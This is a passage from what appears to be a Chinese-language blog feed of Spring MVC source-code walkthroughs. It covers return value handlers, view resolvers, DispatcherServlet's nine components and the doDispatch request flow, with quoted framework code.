(logger.isDebugEnabled()) &#123;String exMsg &#x3D; ex.getMessage();if (exMsg !&#x3D; null &amp;&amp; !exMsg.contains(parameter.getExecutable().toGenericString())) &#123;logger.debug(formatArgumentError(parameter, exMsg));&#125;&#125;throw ex;&#125;&#125;return args;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h4 id="返回值处理器"><a href="#返回值处理器" class="headerlink" title="返回值处理器"></a>返回值处理器</h4><blockquote><p>15个返回值处理器</p></blockquote><p> ServletInvocableHandlerMethod.invokeAndHandle</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">invokeAndHandle</span><span class="token punctuation">(</span><span class="token class-name">ServletWebRequest</span> webRequest<span class="token punctuation">,</span> <span class="token class-name">ModelAndViewContainer</span> mavContainer<span class="token punctuation">,</span>      <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> providedArgs<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>   <span class="token comment">/**    * 目标方法的放射执行    */</span>   <span class="token class-name">Object</span> returnValue <span class="token operator">=</span> <span class="token function">invokeForRequest</span><span class="token punctuation">(</span>webRequest<span class="token punctuation">,</span> mavContainer<span class="token punctuation">,</span> providedArgs<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">setResponseStatus</span><span class="token punctuation">(</span>webRequest<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>returnValue <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isRequestNotModified</span><span class="token punctuation">(</span>webRequest<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">getResponseStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">||</span> mavContainer<span class="token punctuation">.</span><span class="token function">isRequestHandled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">disableContentCachingIfNecessary</span><span class="token punctuation">(</span>webRequest<span class="token punctuation">)</span><span class="token punctuation">;</span>         mavContainer<span class="token punctuation">.</span><span class="token function">setRequestHandled</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">hasText</span><span class="token punctuation">(</span><span class="token function">getResponseStatusReason</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      mavContainer<span class="token punctuation">.</span><span class="token function">setRequestHandled</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   mavContainer<span class="token punctuation">.</span><span class="token function">setRequestHandled</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">Assert</span><span class="token punctuation">.</span><span class="token function">state</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>returnValueHandlers <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"No return value handlers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>returnValueHandlers<span class="token punctuation">.</span><span class="token function">handleReturnValue</span><span class="token punctuation">(</span>            returnValue<span class="token punctuation">,</span> <span class="token function">getReturnValueType</span><span class="token punctuation">(</span>returnValue<span class="token punctuation">)</span><span class="token punctuation">,</span> mavContainer<span class="token punctuation">,</span> webRequest<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         logger<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token function">formatErrorForReturnValue</span><span class="token punctuation">(</span>returnValue<span class="token punctuation">)</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">throw</span> ex<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>找到 returnValueHandlers 执行handleReturnValue</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handleReturnValue</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Nullable</span> <span class="token class-name">Object</span> returnValue<span class="token punctuation">,</span> <span class="token class-name">MethodParameter</span> returnType<span class="token punctuation">,</span>      <span class="token class-name">ModelAndViewContainer</span> mavContainer<span class="token punctuation">,</span> <span class="token class-name">NativeWebRequest</span> webRequest<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>   <span class="token comment">/**    * 找到合适的返回值处理器    */</span>   <span class="token class-name">HandlerMethodReturnValueHandler</span> handler <span class="token operator">=</span> <span class="token function">selectHandler</span><span class="token punctuation">(</span>returnValue<span class="token punctuation">,</span> returnType<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>handler <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"Unknown return value type: "</span> <span class="token operator">+</span> returnType<span class="token punctuation">.</span><span class="token function">getParameterType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">/**    * 执行返回值处理器的处理方法    */</span>   handler<span class="token punctuation">.</span><span class="token function">handleReturnValue</span><span class="token punctuation">(</span>returnValue<span class="token punctuation">,</span> returnType<span class="token punctuation">,</span> mavContainer<span class="token punctuation">,</span> webRequest<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>逻辑依然是以先找到为准</p><p>接下来执行后置的视图解析器相关业务流程</p><h4 id="视图解析器"><a href="#视图解析器" class="headerlink" title="视图解析器"></a>视图解析器</h4><h5 id="核心接口"><a href="#核心接口" class="headerlink" title="核心接口"></a>核心接口</h5><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">View</span> <span class="token punctuation">&#123;</span>   <span class="token class-name">String</span> <span class="token constant">RESPONSE_STATUS_ATTRIBUTE</span> <span class="token operator">=</span> <span class="token class-name">View</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".responseStatus"</span><span class="token punctuation">;</span>   <span class="token class-name">String</span> <span class="token constant">PATH_VARIABLES</span> <span class="token operator">=</span> <span class="token class-name">View</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".pathVariables"</span><span class="token punctuation">;</span>   <span class="token class-name">String</span> <span class="token constant">SELECTED_CONTENT_TYPE</span> <span class="token operator">=</span> <span class="token class-name">View</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".selectedContentType"</span><span class="token punctuation">;</span>   <span class="token annotation punctuation">@Nullable</span>   <span class="token keyword">default</span> <span class="token class-name">String</span> <span class="token function">getContentType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">void</span> <span class="token function">render</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Nullable</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token punctuation">></span></span> model<span class="token punctuation">,</span> <span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span>         <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">public interface ViewResolver &#123;   @Nullable   View resolveViewName(String viewName, Locale locale) throws Exception;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>View 视图 </p><p>ViewResolver  视图解析</p><h5 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h5><p>  HandlerAdapter执行完成后会返回ModelAndView对象（里面包含viewName）</p><p>所有ViewResolver去解析viewName，一得到就返回，得到View对象，最后调用VIew对象render渲染</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>SpringMVC源码</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>剑指源码-springmvc-(二)-九大组件概述</title>
    <link href="/posts/fd09ed1d.html"/>
    <url>/posts/fd09ed1d.html</url>
    
    <content type="html"><![CDATA[<p>概述springMVC九大组件的相关概念，及其基本作用，了解其初始化实现机制</p><span id="more"></span><h2 id="了解初始化的时机"><a href="#了解初始化的时机" class="headerlink" title="了解初始化的时机"></a>了解初始化的时机</h2><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220516212304671.png" alt="image-20220516212304671"></p><p>初始化web容器的时候initWebApplicationContext，有设置监听器wac.addApplicationListener(new SourceFilteringListener(wac, new ContextRefreshListener()));</p><p>而FrameworkServlet中执行了onRefresh 方法，由子类实现</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">public void onApplicationEvent(ContextRefreshedEvent event) &#123;  this.refreshEventReceived &#x3D; true;  synchronized (this.onRefreshMonitor) &#123;     onRefresh(event.getApplicationContext());  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这里DispatcherServlet里面实现了onRefresh方法这里面会对九大组件进行初始化</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">@Overrideprotected void onRefresh(ApplicationContext context) &#123;  initStrategies(context);&#125;&#x2F;*** Initialize the strategy objects that this servlet uses.* &lt;p&gt;May be overridden in subclasses in order to initialize further strategy objects.*&#x2F;protected void initStrategies(ApplicationContext context) &#123;  initMultipartResolver(context);  initLocaleResolver(context);  initThemeResolver(context);  initHandlerMappings(context);  initHandlerAdapters(context);  initHandlerExceptionResolvers(context);  initRequestToViewNameTranslator(context);  initViewResolvers(context);  initFlashMapManager(context);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="九大组件介绍"><a href="#九大组件介绍" class="headerlink" title="九大组件介绍"></a>九大组件介绍</h2><blockquote><p><a href="https://docs.spring.io/spring-framework/docs/current/reference/html/web.html#mvc-servlet-special-bean-types%E5%AE%98%E6%96%B9%E8%BF%99%E9%87%8C%E5%88%97%E4%B8%BE%E4%BA%86%E5%85%AB%E5%A4%A7%E7%BB%84%E4%BB%B6%EF%BC%8CRequestToViewNameTranslator%E4%BB%8B%E7%BB%8D%E7%9B%B8%E5%AF%B9%E8%BE%83%E5%B0%91">https://docs.spring.io/spring-framework/docs/current/reference/html/web.html#mvc-servlet-special-bean-types官方这里列举了八大组件，RequestToViewNameTranslator介绍相对较少</a></p><p>这里的组件除了 MultipartResolver，都有默认实现，也就是说如果我们要实现文件上传，就需要自己实现一个MultipartResolver</p></blockquote><p>前置概念：<code>Handler</code>、<code>HandlerMapping</code>和<code>HandlerAdapter</code></p><p>Handler：处理器，实际上处理请求的就是Handler</p><p>HandlerMapping：处理器映射器，查找Handler的，SpringMVC会接收很多request请求，如何确定哪一个请求是哪一个Handler，就是靠HandlerMapping</p><p>HandlerAdapter：处理器适配器，灵活的调用Handler处理具体逻辑</p><ul><li><strong>HandlerMapping（处理器映射器）</strong></li></ul><p> 根据<code>request</code>查找请求对应的 <code>Handler</code> 和 <code>Interceptor</code></p><ul><li><strong>HandlerAdapter（处理器适配器）</strong></li></ul><p> 用来适配找到<code>Handler</code>对应的适配器，并进行执行</p><ul><li><strong>HandlerExceptionResolver（异常解析器 ）</strong></li></ul><p> 处理 <code>Handler</code> 产⽣的异常，根据异常设置<code>ModelAndView</code>，之后交给渲染⽅法进⾏渲染</p><ul><li><strong>ViewResolver（视图解析器）</strong></li></ul><p> 将 <code>String</code> 类型的视图名和 <code>Locale</code> 解析为 <code>View</code> 类型的视图</p><ul><li><strong>RequestToViewNameTranslator（请求视图名转换器）</strong></li></ul><p> 从请求中获取 <code>ViewName</code></p><ul><li><strong>LocaleResolver（区域化解析器）</strong></li></ul><p> 从请求中解析出 <code>Locale</code></p><ul><li><strong>ThemeResolver（主题解析器）</strong></li></ul><p> 从请求中解析出主题名，并获取主题具体的资源</p><ul><li><strong>MultipartResolver（分片解析器）</strong></li></ul><p> 封装普通的请求，使其拥有⽂件上传的功能</p><ul><li><strong>FlashMapManager（闪存管理器）</strong></li></ul><p> ⽤于重定向时的参数传递</p><h2 id="SpringMVC的请求链路"><a href="#SpringMVC的请求链路" class="headerlink" title="SpringMVC的请求链路"></a>SpringMVC的请求链路</h2><blockquote><p>SpringMVC的请求最基础原理是一个DispatcherServlet来处理请求，DispatcherServlet的最顶层也是一个Servlet，所以也是遵循Servlet规范来执行</p></blockquote><p>从<code>DispatcherServlet</code> 的Diagram可以看出，上三层分别是Servlet、GenericServlet、HttpServlet。这三个属于Servlet规范然后是HttpServletBean FrameworkServlet以及DispatcherServlet 后三个是属于Spring家族的</p><p>当前端发送一个请求时候，执行到<code>Servlet.service()</code>—&gt;<code>GenericServlet.service()</code>—&gt;<code>HttpServlet.service()</code>执行到相应的doGet&#x2F;doPost—&gt;FrameworkServlet会重写doGet&#x2F;doPost，全部去执行<code>processRequest()</code>，留给子类的<code>doService()</code>—&gt;DispatcherServlet实现doService，最终调用到<code>doDispatch()</code></p><p>所以，分析SpringMVC请求链路，从重分析<code>doDispatch</code>逻辑</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"deprecation"</span><span class="token punctuation">)</span><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doDispatch</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span><span class="token class-name">HttpServletRequest</span> processedRequest <span class="token operator">=</span> request<span class="token punctuation">;</span><span class="token class-name">HandlerExecutionChain</span> mappedHandler <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token comment">// 文件上传的标识</span><span class="token keyword">boolean</span> multipartRequestParsed <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token comment">// 异步请求支持</span><span class="token class-name">WebAsyncManager</span> asyncManager <span class="token operator">=</span> <span class="token class-name">WebAsyncUtils</span><span class="token punctuation">.</span><span class="token function">getAsyncManager</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token class-name">ModelAndView</span> mv <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token class-name">Exception</span> dispatchException <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token comment">//检查是否文件上传,判断</span>processedRequest <span class="token operator">=</span> <span class="token function">checkMultipart</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>multipartRequestParsed <span class="token operator">=</span> <span class="token punctuation">(</span>processedRequest <span class="token operator">!=</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Determine handler for the current request.</span><span class="token comment">// 使用HandlerMapping决定使用哪个Handler处理当前请求，会构造出 目标方法+拦截器链</span>mappedHandler <span class="token operator">=</span> <span class="token function">getHandler</span><span class="token punctuation">(</span>processedRequest<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>mappedHandler <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">noHandlerFound</span><span class="token punctuation">(</span>processedRequest<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Determine handler adapter for the current request.</span><span class="token comment">// 使用HandlerAdapter 知道适配器</span><span class="token class-name">HandlerAdapter</span> ha <span class="token operator">=</span> <span class="token function">getHandlerAdapter</span><span class="token punctuation">(</span>mappedHandler<span class="token punctuation">.</span><span class="token function">getHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Process last-modified header, if supported by the handler.</span><span class="token class-name">String</span> method <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">boolean</span> isGet <span class="token operator">=</span> <span class="token class-name">HttpMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>isGet <span class="token operator">||</span> <span class="token class-name">HttpMethod</span><span class="token punctuation">.</span><span class="token constant">HEAD</span><span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">long</span> lastModified <span class="token operator">=</span> ha<span class="token punctuation">.</span><span class="token function">getLastModified</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> mappedHandler<span class="token punctuation">.</span><span class="token function">getHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ServletWebRequest</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">checkNotModified</span><span class="token punctuation">(</span>lastModified<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> isGet<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 处理拦截器链的 preHandle （前置）方法</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>mappedHandler<span class="token punctuation">.</span><span class="token function">applyPreHandle</span><span class="token punctuation">(</span>processedRequest<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Actually invoke the handler.</span><span class="token comment">// 真正反射执行</span>mv <span class="token operator">=</span> ha<span class="token punctuation">.</span><span class="token function">handle</span><span class="token punctuation">(</span>processedRequest<span class="token punctuation">,</span> response<span class="token punctuation">,</span> mappedHandler<span class="token punctuation">.</span><span class="token function">getHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>asyncManager<span class="token punctuation">.</span><span class="token function">isConcurrentHandlingStarted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">applyDefaultViewName</span><span class="token punctuation">(</span>processedRequest<span class="token punctuation">,</span> mv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 处理拦截器链的 preHandle （后置）方法</span>mappedHandler<span class="token punctuation">.</span><span class="token function">applyPostHandle</span><span class="token punctuation">(</span>processedRequest<span class="token punctuation">,</span> response<span class="token punctuation">,</span> mv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>dispatchException <span class="token operator">=</span> ex<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// As of 4.3, we're processing Errors thrown from handler methods as well,</span><span class="token comment">// making them available for @ExceptionHandler methods and other scenarios.</span>dispatchException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NestedServletException</span><span class="token punctuation">(</span><span class="token string">"Handler dispatch failed"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">processDispatchResult</span><span class="token punctuation">(</span>processedRequest<span class="token punctuation">,</span> response<span class="token punctuation">,</span> mappedHandler<span class="token punctuation">,</span> mv<span class="token punctuation">,</span> dispatchException<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">triggerAfterCompletion</span><span class="token punctuation">(</span>processedRequest<span class="token punctuation">,</span> response<span class="token punctuation">,</span> mappedHandler<span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">triggerAfterCompletion</span><span class="token punctuation">(</span>processedRequest<span class="token punctuation">,</span> response<span class="token punctuation">,</span> mappedHandler<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">NestedServletException</span><span class="token punctuation">(</span><span class="token string">"Handler processing failed"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">finally</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>asyncManager<span class="token punctuation">.</span><span class="token function">isConcurrentHandlingStarted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// Instead of postHandle and afterCompletion</span><span class="token keyword">if</span> <span class="token punctuation">(</span>mappedHandler <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>mappedHandler<span class="token punctuation">.</span><span class="token function">applyAfterConcurrentHandlingStarted</span><span class="token punctuation">(</span>processedRequest<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token comment">// Clean up any resources used by a multipart request.</span><span class="token keyword">if</span> <span class="token punctuation">(</span>multipartRequestParsed<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">cleanupMultipart</span><span class="token punctuation">(</span>processedRequest<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>核心流程如上，这里面会涉及到HandlerMaping 的几种实现,以及HandlerAdapter的几种实现，下一章节详细分析</p><p>这里拦截器概念引入。和以前的拦截器过滤器</p><h3 id="过滤器、拦截器、监听器对比"><a href="#过滤器、拦截器、监听器对比" class="headerlink" title="过滤器、拦截器、监听器对比"></a>过滤器、拦截器、监听器对比</h3><ul><li><p><strong>过滤器</strong></p><p>Filter过滤器是Servlet容器层面的，过滤器是对数据进行过滤，预处理过程</p></li><li><p><strong>拦截器</strong></p><p>Interceptor拦截器和Filter和Listener有本质上的不同，前面二者都是依赖于Servlet容器，而Interceptor则是依赖于Spring框架，是aop的一种表现，基于Java的动态代理实现的。</p><p>实现步骤：</p><ol><li>声明拦截器的类：通过实现 HandlerInterceptor接口，实现preHandle、postHandle和afterCompletion方法。</li><li>通过配置类配置拦截器：通过实现WebMvcConfigurer接口，实现addInterceptors方法。</li></ol></li><li><p><strong>监听器</strong></p><p>Listener监听器也是Servlet层面，可以用于监听Web应用中某些对象、信息的创建、销毁和修改等动作发生，然后做出相应的响应处理</p><p>监听器分为3类：</p><ol><li>ServletContext：对应application，实现接口ServletContextListener。在整个Web服务中只有一个，在Web服务关闭时销毁。可用于做数据缓存，例如结合redis，在Web服务创建时从数据库拉取数据到缓存服务器。</li><li>HttpSession：对应session会话，实现接口HttpSessionListener。在会话起始时创建，一端关闭会话后销毁。可用作获取在线用户数量。</li><li>ServletRequest：对应request，实现接口ServletRequestListener。request对象是客户发送请求时创建的，用于封装请求数据，请求处理完毕后销毁。可用作封装用户信息。</li></ol></li></ul>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>SpringMVC源码</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>剑指源码-springmvc-(一)-序章</title>
    <link href="/posts/9857fe7d.html"/>
    <url>/posts/9857fe7d.html</url>
    
